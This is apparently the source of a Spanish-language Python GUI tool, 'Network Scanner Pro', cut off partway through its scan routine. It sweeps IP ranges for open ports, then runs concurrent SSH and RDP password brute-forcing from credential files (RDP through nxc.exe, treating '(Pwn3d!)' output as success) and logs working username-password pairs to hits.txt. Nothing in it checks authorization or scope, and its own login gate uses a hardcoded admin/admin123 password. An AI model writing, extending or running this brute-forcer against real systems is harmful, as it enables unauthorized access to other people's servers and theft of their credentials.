import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import os
import asyncio
import threading
import asyncssh
import subprocess
import configparser
from datetime import datetime
from queue import Queue
from cryptography.fernet import Fernet
from typing import List, Dict, Tuple, Optional
from concurrent.futures import ThreadPoolExecutor
import ipaddress
import socket

# ============================================================================
# CONFIGURACIÓN OPTIMIZADA
# ============================================================================
DEFAULT_CONFIG = {
    'threads': 20,
    'timeout': 3,
    'attempts': 1,
    'default_port': 3389,
    'check_ssh': True,
    'check_rdp': True,
    'full_scan': False,
    'max_pending': 1000,
    'update_interval': 50,
    'batch_size': 50,
    'scan_chunk_size': 250,
    'max_concurrent_scans': 200,
    'connection_pool_size': 10,
    'max_concurrent_entries': 10,   # Nuevo: número de entradas de IP a procesar en paralelo
}

COMMON_PORTS = [21, 22, 23, 80, 443, 3389, 8080, 3306, 445, 139, 135, 53, 1433, 1521]

TEXTS = {
    'app_title': "Network Scanner Pro",
    'auth_title': "Autenticación",
    'auth_user': "Usuario:",
    'auth_pass': "Contraseña:",
    'auth_button': "Ingresar",
    'auth_error': "Credenciales incorrectas",
    'config_section': "Configuración",
    'files_section': "Archivos",
    'ips_file': "Archivo de IPs:",
    'creds_file': "Archivo de credenciales:",
    'params_section': "Parámetros",
    'threads_label': "Hilos:",
    'timeout_label': "Timeout:",
    'attempts_label': "Intentos:",
    'rdp_port_label': "Puerto RDP:",
    'stats_section': "Estadísticas",
    'stats_ips': "IPs escaneadas: {count}",
    'stats_active': "IPs activas: {count}",
    'stats_ports': "Puertos abiertos: {count}",
    'stats_creds': "Credenciales válidas: {count}",
    'stats_time': "Tiempo transcurrido: {time}",
    'scan_start': "Iniciar Escaneo",
    'scan_stop': "Detener",
    'scan_methods': ["Rápido", "Estándar", "Completo"],
    'export_ips': "Exportar IPs",
    'export_ports': "Exportar Puertos",
    'export_ssh': "Exportar SSH",
    'export_rdp': "Exportar RDP",
    'tab_main': "Principal",
    'tab_log': "Registro",
    'tab_ips': "IPs Activas",
    'tab_ports': "Puertos Abiertos",
    'tab_ssh': "SSH",
    'tab_rdp': "RDP",
}

COLORS = {
    'bg_main': "#1e1e2d",
    'bg_secondary': "#2d2d3d",
    'fg_main': "#ffffff",
    'button_bg': "#3a3a4a",
    'button_active': "#4a4a5a",
    'highlight': "#4a6baf",
    'close_bg': "#ff5555",
    'close_active': "#ff0000",
    'text_bg': "#2d2d3d",
}

# ============================================================================
# MANAGERS Y UTILIDADES
# ============================================================================
class CredentialManager:
    def __init__(self):
        self.key = self._load_or_create_key()
        self.cipher = Fernet(self.key)

    def _load_or_create_key(self) -> bytes:
        key_path = os.path.join(os.path.dirname(__file__), "secret.key")
        if os.path.exists(key_path):
            with open(key_path, 'rb') as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(key_path, 'wb') as f:
                f.write(key)
            return key

class ScanResult:
    def __init__(self):
        self.active_ips = []
        self.open_ports = {}
        self.ssh_success = []
        self.rdp_success = []
        self.scan_stats = {
            'ips_scanned': 0, 'ips_active': 0, 'ports_found': 0,
            'creds_valid': 0, 'start_time': None, 'end_time': None,
        }

class NetworkUtils:
    @staticmethod
    def is_valid_ip(ip_str: str) -> bool:
        try:
            ipaddress.ip_address(ip_str)
            return True
        except ValueError:
            return False

    @staticmethod
    async def check_port_async(ip: str, port: int, timeout: float = 3) -> bool:
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port),
                timeout=timeout
            )
            writer.close()
            await writer.wait_closed()
            return True
        except:
            return False

# ============================================================================
# LÓGICA PRINCIPAL DE ESCANEO OPTIMIZADA
# ============================================================================
class NetworkScanner:
    def __init__(self, config: Dict, credential_manager: CredentialManager):
        self.config = config
        self.cred_manager = credential_manager
        self.results = ScanResult()
        self.is_scanning = False
        self.should_stop = False
        self.app_instance = None
        self._executor = ThreadPoolExecutor(max_workers=config.get('threads', 20))
        self._connection_cache = {}

    def __del__(self):
        if hasattr(self, '_executor'):
            self._executor.shutdown(wait=False)

    def load_ips_from_file(self, filepath: str) -> List[Dict[str, str]]:
        entries = []
        if os.path.exists(filepath):
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
            except UnicodeDecodeError:
                with open(filepath, 'r', encoding='latin-1') as f:
                    lines = f.readlines()

            for line in lines:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                parts = line.split(':')
                ip_candidate = parts[0]
                try:
                    ipaddress.ip_network(ip_candidate, strict=False)
                    entry = {'ip': ip_candidate}
                    if len(parts) >= 3:
                        entry['user'] = parts[1]
                        entry['password'] = ':'.join(parts[2:])
                    entries.append(entry)
                except ValueError:
                    continue
        return entries

    def load_credentials_from_file(self, filepath: str) -> List[Tuple[str, str]]:
        """Carga credenciales como lista de tuplas (mantiene duplicados)"""
        credentials = []
        if os.path.exists(filepath):
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and ':' in line and not line.startswith('#'):
                            user, password = line.split(':', 1)
                            if user and password:
                                credentials.append((user, password))
            except UnicodeDecodeError:
                with open(filepath, 'r', encoding='latin-1') as f:
                    for line in f:
                        line = line.strip()
                        if line and ':' in line and not line.startswith('#'):
                            user, password = line.split(':', 1)
                            if user and password:
                                credentials.append((user, password))
        return credentials

    async def scan_ip_range(self, ip_range: str, ports: List[int]) -> List[str]:
        active_ips = []
        try:
            network = ipaddress.ip_network(ip_range, strict=False)
            ips_to_scan = [str(ip) for ip in network.hosts()]
        except ValueError:
            ips_to_scan = [ip_range]

        semaphore = asyncio.Semaphore(self.config.get('max_concurrent_scans', 200))

        async def check_ip(ip: str) -> Optional[str]:
            async with semaphore:
                if self.should_stop:
                    return None
                for port in ports:
                    if await NetworkUtils.check_port_async(ip, port, self.config['timeout']):
                        return ip
                return None

        tasks = [check_ip(ip) for ip in ips_to_scan]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        active_ips = [ip for ip in results if ip and isinstance(ip, str)]
        return active_ips

    async def scan_ports_on_ip(self, ip: str, ports_to_scan: List[int]) -> List[int]:
        open_ports = []
        semaphore = asyncio.Semaphore(self.config.get('max_concurrent_scans', 200))

        async def check_port(port: int) -> Tuple[int, bool]:
            async with semaphore:
                if self.should_stop:
                    return port, False
                is_open = await NetworkUtils.check_port_async(ip, port, self.config['timeout'])
                return port, is_open

        tasks = [check_port(port) for port in ports_to_scan]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        open_ports = [port for port, is_open in results if is_open]
        return open_ports

    async def test_ssh_connection(self, ip: str, port: int, username: str, password: str) -> bool:
        if self.should_stop:
            return False
        try:
            async with asyncssh.connect(
                host=ip, port=port, username=username, password=password,
                known_hosts=None, connect_timeout=self.config['timeout']
            ) as conn:
                await conn.close()
                return True
        except:
            return False

    async def test_rdp_connection(self, ip: str, port: int, username: str, password: str) -> bool:
        if self.should_stop:
            return False

        nxc_path = os.path.join(os.path.dirname(__file__), "nxc.exe")
        cmd = [
            nxc_path, "rdp", ip,
            "-u", username, "-p", password,
            "--port", str(port),
            "--no-output"
        ]

        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=self.config['timeout'])
            except asyncio.TimeoutError:
                process.kill()
                await process.wait()
                return False

            output = stdout.decode(errors='ignore') + stderr.decode(errors='ignore')
            return "(Pwn3d!)" in output
        except Exception:
            return False

    async def brute_force_service(self, ip: str, port: int,
                                global_credentials: List[Tuple[str, str]],
                                service_type: str,
                                ip_specific_creds: Optional[Tuple[str, str]] = None) -> List[Tuple[str, str]]:
        """Fuerza bruta optimizada: específicas primero, si fallan → globales"""
        valid_creds = []
        semaphore = asyncio.Semaphore(self.config.get('batch_size', 50))

        async def test_credential(user: str, password: str) -> Tuple[str, str, bool]:
            async with semaphore:
                if self.should_stop:
                    return user, password, False
                if service_type == 'ssh':
                    success = await self.test_ssh_connection(ip, port, user, password)
                else:
                    success = await self.test_rdp_connection(ip, port, user, password)
                return user, password, success

        # 1. Probar credenciales específicas de la IP (si existen)
        if ip_specific_creds and ip_specific_creds[0] and ip_specific_creds[1]:
            user, password = ip_specific_creds
            _, _, success = await test_credential(user, password)
            if success:
                valid_creds.append((user, password))
                if self.app_instance:
                    self.app_instance.save_valid_hit(ip, port, user, password, service_type)
                return valid_creds
            # ❌ FALLÓ: continuar con credenciales globales

        # 2. Probar credenciales globales en batches paralelos
        batch_size = self.config.get('batch_size', 50)
        tasks = []

        for i in range(0, len(global_credentials), batch_size):
            if self.should_stop:
                break
            batch = global_credentials[i:i + batch_size]
            batch_tasks = [test_credential(user, passwd) for user, passwd in batch]
            tasks.extend(batch_tasks)

        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                if isinstance(result, tuple) and len(result) == 3:
                    user, password, success = result
                    if success:
                        valid_creds.append((user, password))
                        if self.app_instance:
                            self.app_instance.save_valid_hit(ip, port, user, password, service_type)

        return valid_creds

    def stop_scan(self):
        self.should_stop = True

    def reset_scan(self):
        self.results = ScanResult()
        self.is_scanning = False
        self.should_stop = False

# ============================================================================
# INTERFAZ GRÁFICA (GUI) - ORIGINAL RESPETADA CON MEJORAS DE CONCURRENCIA
# ============================================================================
class NetworkScannerApp:
    def __init__(self, root):
        self.root = root
        self.setup_window()
        self.setup_style()
        self.cred_manager = CredentialManager()
        self.network_scanner = NetworkScanner(DEFAULT_CONFIG, self.cred_manager)
        self.network_scanner.app_instance = self
        self.scanning = False
        self._log_buffer = []
        self._result_queue = Queue()
        self.scan_history = []
        self.ip_file_entry = None
        self.creds_file_entry = None
        self.ip_count_label = None
        self.creds_count_label = None
        self.threads_entry = None
        self.timeout_entry = None
        self.attempts_entry = None
        self.default_port_entry = None
        self.check_ssh_var = None
        self.check_rdp_var = None
        self.full_scan_var = None
        self.start_button = None
        self.stop_button = None
        self.scan_method = None
        self.progress = None
        self.log_text = None
        self.ip_text = None
        self.ports_text = None
        self.ssh_text = None
        self.rdp_text = None
        self.stats_labels = {}
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        self.create_widgets()
        self.load_default_config()
        self.update_file_counts()
        self.root.after(50, self._process_results)
        self.root.after(50, self._flush_log_buffer)
        self.show_auth_window()

    def setup_window(self):
        self.root.title(TEXTS['app_title'])
        self.root.geometry("750x650")
        self.root.overrideredirect(True)
        self.root.wm_attributes('-alpha', 0.95)
        self.root.configure(bg=COLORS['bg_main'])
        self.root.resizable(True, True)
        self.x = self.y = 0
        self.root.bind("<Button-1>", self.start_move)
        self.root.bind("<ButtonRelease-1>", self.stop_move)
        self.root.bind("<B1-Motion>", self.on_motion)

    def setup_style(self):
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure(".", background=COLORS['bg_main'], foreground=COLORS['fg_main'], fieldbackground=COLORS['bg_secondary'])
        self.style.configure("TFrame", background=COLORS['bg_main'])
        self.style.configure("TLabel", background=COLORS['bg_main'], foreground=COLORS['fg_main'])
        self.style.configure("TButton", background=COLORS['button_bg'], foreground=COLORS['fg_main'], borderwidth=1)
        self.style.map("TButton", background=[('active', COLORS['button_active']), ('disabled', COLORS['bg_main'])], foreground=[('disabled', '#777777')])
        self.style.configure("TEntry", fieldbackground=COLORS['bg_secondary'], foreground=COLORS['fg_main'], insertcolor=COLORS['fg_main'])
        self.style.configure("TNotebook", background=COLORS['bg_main'], borderwidth=0)
        self.style.configure("TNotebook.Tab", background=COLORS['button_bg'], foreground=COLORS['fg_main'], padding=[5, 3])
        self.style.map("TNotebook.Tab", background=[('selected', COLORS['highlight']), ('active', COLORS['button_active'])])
        close_btn = tk.Button(self.root, text="✕", command=self.root.destroy, bg=COLORS['close_bg'], fg="white", bd=0, highlightthickness=0, font=("Arial", 12, "bold"), activebackground=COLORS['close_active'])
        close_btn.place(relx=0.99, rely=0.01, anchor="ne", width=25, height=25)
        minimize_btn = tk.Button(self.root, text="–", command=self.root.iconify, bg=COLORS['button_bg'], fg="white", bd=0, highlightthickness=0, font=("Arial", 12, "bold"), activebackground=COLORS['button_active'])
        minimize_btn.place(relx=0.95, rely=0.01, anchor="ne", width=25, height=25)

    def show_auth_window(self):
        self.auth_window = tk.Toplevel(self.root)
        self.auth_window.title(TEXTS['auth_title'])
        self.auth_window.geometry("300x200")
        self.auth_window.resizable(False, False)
        self.auth_window.overrideredirect(True)
        self.auth_window.configure(bg=COLORS['bg_main'])
        window_width, window_height = 300, 200
        screen_width = self.auth_window.winfo_screenwidth()
        screen_height = self.auth_window.winfo_screenheight()
        x = (screen_width // 2) - (window_width // 2)
        y = (screen_height // 2) - (window_height // 2)
        self.auth_window.geometry(f"{window_width}x{window_height}+{x}+{y}")
        ttk.Label(self.auth_window, text="Acceso al Sistema", font=("Arial", 12, "bold")).pack(pady=10)
        ttk.Label(self.auth_window, text=TEXTS['auth_user']).pack(pady=5)
        self.auth_user = ttk.Entry(self.auth_window)
        self.auth_user.pack(pady=5)
        ttk.Label(self.auth_window, text=TEXTS['auth_pass']).pack(pady=5)
        self.auth_pass = ttk.Entry(self.auth_window, show="*")
        self.auth_pass.pack(pady=5)
        ttk.Button(self.auth_window, text=TEXTS['auth_button'], command=self.check_credentials).pack(pady=10)
        self.root.withdraw()
        self.auth_window.protocol("WM_DELETE_WINDOW", self.root.destroy)

    def check_credentials(self):
        if self.auth_user.get() == "admin" and self.auth_pass.get() == "admin123":
            self.auth_window.destroy()
            self.root.deiconify()
            self.center_window()
        else:
            messagebox.showerror("Error", TEXTS['auth_error'])
            self.auth_pass.delete(0, tk.END)

    def center_window(self):
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f"{width}x{height}+{x}+{y}")

    def create_widgets(self):
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.create_main_tab()

    def create_main_tab(self):
        self.main_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.main_frame, text=TEXTS['tab_main'])
        left_panel = ttk.Frame(self.main_frame, width=300)
        left_panel.pack(side=tk.LEFT, fill=tk.Y, padx=5, pady=5)
        left_panel.pack_propagate(False)
        right_panel = ttk.Frame(self.main_frame)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        self._create_config_panel(left_panel)
        self._create_results_panel(right_panel)

    def _create_config_panel(self, parent):
        config_frame = ttk.LabelFrame(parent, text=TEXTS['config_section'], padding=5)
        config_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        file_frame = ttk.LabelFrame(config_frame, text=TEXTS['files_section'], padding=5)
        file_frame.pack(fill=tk.X, padx=5, pady=3)
        ttk.Label(file_frame, text=TEXTS['ips_file']).pack(anchor=tk.W)
        ip_container = ttk.Frame(file_frame)
        ip_container.pack(fill=tk.X, pady=2)
        self.ip_file_entry = ttk.Entry(ip_container)
        self.ip_file_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.ip_file_entry.insert(0, os.path.join(os.path.dirname(__file__), "ip.txt"))
        ttk.Button(ip_container, text="...", width=3, command=lambda: self.browse_file(self.ip_file_entry)).pack(side=tk.RIGHT, padx=3)
        self.ip_count_label = ttk.Label(file_frame, text="0 IPs cargadas")
        self.ip_count_label.pack(anchor=tk.W)
        ttk.Label(file_frame, text=TEXTS['creds_file']).pack(anchor=tk.W, pady=(5,0))
        creds_container = ttk.Frame(file_frame)
        creds_container.pack(fill=tk.X, pady=2)
        self.creds_file_entry = ttk.Entry(creds_container)
        self.creds_file_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.creds_file_entry.insert(0, os.path.join(os.path.dirname(__file__), "creds.txt"))
        ttk.Button(creds_container, text="...", width=3, command=lambda: self.browse_file(self.creds_file_entry)).pack(side=tk.RIGHT, padx=3)
        self.creds_count_label = ttk.Label(file_frame, text="0 credenciales cargadas")
        self.creds_count_label.pack(anchor=tk.W)
        params_frame = ttk.LabelFrame(config_frame, text=TEXTS['params_section'], padding=5)
        params_frame.pack(fill=tk.X, padx=5, pady=3)
        ttk.Label(params_frame, text=TEXTS['threads_label']).grid(row=0, column=0, sticky=tk.W, padx=3, pady=2)
        self.threads_entry = ttk.Entry(params_frame, width=8)
        self.threads_entry.grid(row=0, column=1, sticky=tk.W, padx=3, pady=2)
        ttk.Label(params_frame, text=TEXTS['timeout_label']).grid(row=1, column=0, sticky=tk.W, padx=3, pady=2)
        self.timeout_entry = ttk.Entry(params_frame, width=8)
        self.timeout_entry.grid(row=1, column=1, sticky=tk.W, padx=3, pady=2)
        ttk.Label(params_frame, text=TEXTS['attempts_label']).grid(row=2, column=0, sticky=tk.W, padx=3, pady=2)
        self.attempts_entry = ttk.Entry(params_frame, width=8)
        self.attempts_entry.grid(row=2, column=1, sticky=tk.W, padx=3, pady=2)
        ttk.Label(params_frame, text=TEXTS['rdp_port_label']).grid(row=3, column=0, sticky=tk.W, padx=3, pady=2)
        self.default_port_entry = ttk.Entry(params_frame, width=8)
        self.default_port_entry.grid(row=3, column=1, sticky=tk.W, padx=3, pady=2)
        options_frame = ttk.Frame(params_frame)
        options_frame.grid(row=4, column=0, columnspan=2, sticky=tk.W, pady=5)
        self.check_ssh_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="SSH", variable=self.check_ssh_var).pack(side=tk.LEFT, padx=3)
        self.check_rdp_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="RDP", variable=self.check_rdp_var).pack(side=tk.LEFT, padx=3)
        self.full_scan_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(options_frame, text="Escaneo completo", variable=self.full_scan_var).pack(side=tk.LEFT, padx=3)
        ttk.Button(config_frame, text="Guardar Configuración", command=self.save_config).pack(pady=5)

    def _create_results_panel(self, parent):
        stats_frame = ttk.LabelFrame(parent, text=TEXTS['stats_section'], padding=10)
        stats_frame.pack(fill=tk.X, padx=5, pady=5)
        self.stats_labels = {}
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill=tk.X)
        row1 = ttk.Frame(stats_grid)
        row1.pack(fill=tk.X, pady=2)
        self.stats_labels['ips'] = ttk.Label(row1, text=TEXTS['stats_ips'].format(count=0))
        self.stats_labels['ips'].pack(side=tk.LEFT, expand=True, anchor=tk.W)
        self.stats_labels['activas'] = ttk.Label(row1, text=TEXTS['stats_active'].format(count=0))
        self.stats_labels['activas'].pack(side=tk.LEFT, expand=True, anchor=tk.W)
        self.stats_labels['puertos'] = ttk.Label(row1, text=TEXTS['stats_ports'].format(count=0))
        self.stats_labels['puertos'].pack(side=tk.LEFT, expand=True, anchor=tk.W)
        row2 = ttk.Frame(stats_grid)
        row2.pack(fill=tk.X, pady=2)
        self.stats_labels['creds'] = ttk.Label(row2, text=TEXTS['stats_creds'].format(count=0))
        self.stats_labels['creds'].pack(side=tk.LEFT, expand=True, anchor=tk.W)
        self.stats_labels['tiempo'] = ttk.Label(row2, text=TEXTS['stats_time'].format(time="00:00:00"))
        self.stats_labels['tiempo'].pack(side=tk.LEFT, expand=True, anchor=tk.W)
        self._create_scan_controls(parent)
        self.progress = ttk.Progressbar(parent, orient=tk.HORIZONTAL, mode='determinate')
        self.progress.pack(fill=tk.X, padx=5, pady=3)
        self._create_result_tabs(parent)
        self._create_export_buttons(parent)

    def _create_scan_controls(self, parent):
        control_frame = ttk.Frame(parent)
        control_frame.pack(fill=tk.X, padx=5, pady=3)
        btn_container = ttk.Frame(control_frame)
        btn_container.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.start_button = ttk.Button(btn_container, text=TEXTS['scan_start'], command=self.start_scan)
        self.start_button.pack(side=tk.LEFT, padx=3)
        self.stop_button = ttk.Button(btn_container, text=TEXTS['scan_stop'], state=tk.DISABLED, command=self.stop_scanning)
        self.stop_button.pack(side=tk.LEFT, padx=3)
        self.scan_method = ttk.Combobox(control_frame, values=TEXTS['scan_methods'], state="readonly")
        self.scan_method.set(TEXTS['scan_methods'][1])
        self.scan_method.pack(side=tk.RIGHT, padx=10)

    def _create_result_tabs(self, parent):
        results_notebook = ttk.Notebook(parent)
        results_notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        log_frame = ttk.Frame(results_notebook)
        results_notebook.add(log_frame, text=TEXTS['tab_log'])
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, bg=COLORS['text_bg'], fg=COLORS['fg_main'], insertbackground=COLORS['fg_main'])
        self.log_text.pack(fill=tk.BOTH, expand=True)
        ip_frame = ttk.Frame(results_notebook)
        results_notebook.add(ip_frame, text=TEXTS['tab_ips'])
        self.ip_text = scrolledtext.ScrolledText(ip_frame, wrap=tk.WORD, bg=COLORS['text_bg'], fg=COLORS['fg_main'], insertbackground=COLORS['fg_main'])
        self.ip_text.pack(fill=tk.BOTH, expand=True)
        ports_frame = ttk.Frame(results_notebook)
        results_notebook.add(ports_frame, text=TEXTS['tab_ports'])
        self.ports_text = scrolledtext.ScrolledText(ports_frame, wrap=tk.WORD, bg=COLORS['text_bg'], fg=COLORS['fg_main'], insertbackground=COLORS['fg_main'])
        self.ports_text.pack(fill=tk.BOTH, expand=True)
        ssh_frame = ttk.Frame(results_notebook)
        results_notebook.add(ssh_frame, text=TEXTS['tab_ssh'])
        self.ssh_text = scrolledtext.ScrolledText(ssh_frame, wrap=tk.WORD, bg=COLORS['text_bg'], fg=COLORS['fg_main'], insertbackground=COLORS['fg_main'])
        self.ssh_text.pack(fill=tk.BOTH, expand=True)
        rdp_frame = ttk.Frame(results_notebook)
        results_notebook.add(rdp_frame, text=TEXTS['tab_rdp'])
        self.rdp_text = scrolledtext.ScrolledText(rdp_frame, wrap=tk.WORD, bg=COLORS['text_bg'], fg=COLORS['fg_main'], insertbackground=COLORS['fg_main'])
        self.rdp_text.pack(fill=tk.BOTH, expand=True)

    def _create_export_buttons(self, parent):
        export_frame = ttk.Frame(parent)
        export_frame.pack(fill=tk.X, padx=5, pady=3)
        ttk.Button(export_frame, text=TEXTS['export_ips'], command=lambda: self.export_results("ip_activas.txt")).pack(side=tk.LEFT, padx=2)
        ttk.Button(export_frame, text=TEXTS['export_ports'], command=lambda: self.export_results("puertos_abiertos.txt")).pack(side=tk.LEFT, padx=2)
        ttk.Button(export_frame, text=TEXTS['export_ssh'], command=lambda: self.export_results("ssh_success.txt")).pack(side=tk.LEFT, padx=2)
        ttk.Button(export_frame, text=TEXTS['export_rdp'], command=lambda: self.export_results("rdp_success.txt")).pack(side=tk.LEFT, padx=2)
        ttk.Button(export_frame, text="Exportar Hits", command=lambda: self.export_results("hits.txt")).pack(side=tk.LEFT, padx=2)

    def start_move(self, event): self.x, self.y = event.x, event.y
    def stop_move(self, event): self.x, self.y = None, None
    def on_motion(self, event):
        if self.x is not None and self.y is not None:
            self.root.geometry(f"+{event.x_root - self.x}+{event.y_root - self.y}")

    def browse_file(self, entry_widget):
        filename = filedialog.askopenfilename()
        if filename:
            entry_widget.delete(0, tk.END)
            entry_widget.insert(0, filename)
            self.update_file_counts()

    def update_file_counts(self):
        if self.ip_file_entry and self.ip_count_label:
            ip_file = self.ip_file_entry.get()
            count = len(self.network_scanner.load_ips_from_file(ip_file)) if os.path.exists(ip_file) else 0
            self.ip_count_label.config(text=f"{count} IPs cargadas")
        if self.creds_file_entry and self.creds_count_label:
            creds_file = self.creds_file_entry.get()
            count = len(self.network_scanner.load_credentials_from_file(creds_file)) if os.path.exists(creds_file) else 0
            self.creds_count_label.config(text=f"{count} credenciales cargadas")

    def load_default_config(self):
        config_path = os.path.join(os.path.dirname(__file__), "config.cfg")
        config = configparser.ConfigParser()
        if os.path.exists(config_path):
            config.read(config_path)
        else:
            config["General"] = {k: str(v) for k, v in DEFAULT_CONFIG.items() if k in ['threads', 'timeout', 'attempts', 'default_port']}
            config["General"]["CHECK_SSH"] = "True"
            config["General"]["CHECK_RDP"] = "True"
            config["General"]["FULL_SCAN"] = "False"
            with open(config_path, 'w') as f:
                config.write(f)
        if self.threads_entry:
            self.threads_entry.delete(0, tk.END)
            self.threads_entry.insert(0, config.get("General", "Threads", fallback=str(DEFAULT_CONFIG['threads'])))
        if self.timeout_entry:
            self.timeout_entry.delete(0, tk.END)
            self.timeout_entry.insert(0, config.get("General", "Timeout", fallback=str(DEFAULT_CONFIG['timeout'])))
        if self.attempts_entry:
            self.attempts_entry.delete(0, tk.END)
            self.attempts_entry.insert(0, config.get("General", "Attempts", fallback=str(DEFAULT_CONFIG['attempts'])))
        if self.default_port_entry:
            self.default_port_entry.delete(0, tk.END)
            self.default_port_entry.insert(0, config.get("General", "DEFAULTPORT", fallback=str(DEFAULT_CONFIG['default_port'])))
        if self.check_ssh_var:
            self.check_ssh_var.set(config.getboolean("General", "CHECK_SSH", fallback=True))
        if self.check_rdp_var:
            self.check_rdp_var.set(config.getboolean("General", "CHECK_RDP", fallback=True))
        if self.full_scan_var:
            self.full_scan_var.set(config.getboolean("General", "FULL_SCAN", fallback=False))
        if all([self.threads_entry, self.timeout_entry, self.attempts_entry, self.default_port_entry]):
            self.network_scanner.config.update({
                "threads": int(self.threads_entry.get()),
                "timeout": int(self.timeout_entry.get()),
                "attempts": int(self.attempts_entry.get()),
                "default_port": int(self.default_port_entry.get()),
                "check_ssh": self.check_ssh_var.get(),
                "check_rdp": self.check_rdp_var.get(),
                "full_scan": self.full_scan_var.get()
            })

    def save_config(self):
        config = configparser.ConfigParser()
        config["General"] = {
            "Threads": self.threads_entry.get() if self.threads_entry else "50",
            "Timeout": self.timeout_entry.get() if self.timeout_entry else "5",
            "Attempts": self.attempts_entry.get() if self.attempts_entry else "1",
            "DEFAULTPORT": self.default_port_entry.get() if self.default_port_entry else "3389",
            "CHECK_SSH": str(self.check_ssh_var.get()) if self.check_ssh_var else "True",
            "CHECK_RDP": str(self.check_rdp_var.get()) if self.check_rdp_var else "True",
            "FULL_SCAN": str(self.full_scan_var.get()) if self.full_scan_var else "False"
        }
        with open(os.path.join(os.path.dirname(__file__), "config.cfg"), 'w') as f:
            config.write(f)
        self.load_default_config()
        messagebox.showinfo("Configuración", "Configuración guardada correctamente")

    def log_message(self, message):
        self._log_buffer.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}\n")

    def _flush_log_buffer(self):
        if self._log_buffer and self.log_text:
            self.log_text.insert(tk.END, ''.join(self._log_buffer))
            self.log_text.see(tk.END)
            self._log_buffer.clear()
        self.root.after(self.network_scanner.config.get('update_interval', 50), self._flush_log_buffer)

    def save_valid_hit(self, ip: str, port: int, user: str, password: str, service: str):
        """Guarda credenciales válidas en hits.txt"""
        hits_file = os.path.join(os.path.dirname(__file__), "hits.txt")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            with open(hits_file, 'a', encoding='utf-8') as f:
                f.write(f"{ip}:{user}:{password}  # {service.upper()}:{port} [{timestamp}]\n")
        except Exception as e:
            self.log_message(f"Error al guardar hit: {str(e)}")

    def _process_results(self):
        while not self._result_queue.empty():
            result_type, data = self._result_queue.get()
            txt_attr = {"ip": "ip_text", "port": "ports_text", "ssh": "ssh_text", "rdp": "rdp_text"}.get(result_type)
            txt = getattr(self, txt_attr, None) if txt_attr else None
            if txt:
                txt.insert(tk.END, data + '\n')
                txt.see(tk.END)
                if result_type == "ip" and 'activas' in self.stats_labels:
                    self.stats_labels['activas'].config(text=f"IPs activas: {len(txt.get('1.0', tk.END).splitlines())}")
                elif result_type == "port" and 'puertos' in self.stats_labels:
                    self.stats_labels['puertos'].config(text=f"Puertos abiertos: {len(txt.get('1.0', tk.END).splitlines())}")
                elif result_type in ("ssh", "rdp") and 'creds' in self.stats_labels:
                    total = (len(self.ssh_text.get("1.0", tk.END).splitlines()) if self.ssh_text else 0) + \
                            (len(self.rdp_text.get("1.0", tk.END).splitlines()) if self.rdp_text else 0)
                    self.stats_labels['creds'].config(text=f"Credenciales válidas: {total}")
        self.root.after(self.network_scanner.config.get('update_interval', 50), self._process_results)

    def start_scan(self):
        if self.scanning:
            return
        self.scanning = True
        self.network_scanner.is_scanning = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        for txt in [self.log_text, self.ip_text, self.ports_text, self.ssh_text, self.rdp_text]:
            if txt:
                txt.delete(1.0, tk.END)
        for lbl in self.stats_labels.values():
            lbl.config(text=lbl.cget("text").split(":")[0] + ": 0")
        if self.scan_method:
            m = self.scan_method.get()
            self.network_scanner.config["full_scan"] = (m == "Completo")
        if all([self.threads_entry, self.timeout_entry, self.attempts_entry, self.default_port_entry, self.check_ssh_var, self.check_rdp_var]):
            self.network_scanner.config.update({
                "threads": int(self.threads_entry.get()),
                "timeout": int(self.timeout_entry.get()),
                "attempts": int(self.attempts_entry.get()),
                "default_port": int(self.default_port_entry.get()),
                "check_ssh": self.check_ssh_var.get(),
                "check_rdp": self.check_rdp_var.get()
            })
        self.start_time = datetime.now()
        self.update_timer()
        threading.Thread(target=self.run_scan, daemon=True).start()

    def update_timer(self):
        if self.scanning and 'tiempo' in self.stats_labels:
            self.stats_labels['tiempo'].config(text=f"Tiempo transcurrido: {str(datetime.now() - self.start_time).split('.')[0]}")
            self.root.after(1000, self.update_timer)

    def stop_scanning(self):
        self.network_scanner.stop_scan()
        self.log_message("Deteniendo escaneo...")

    async def perform_scan(self):
        try:
            if not self.ip_file_entry or not self.creds_file_entry:
                self.log_message("Error: Campos de archivos no configurados")
                return

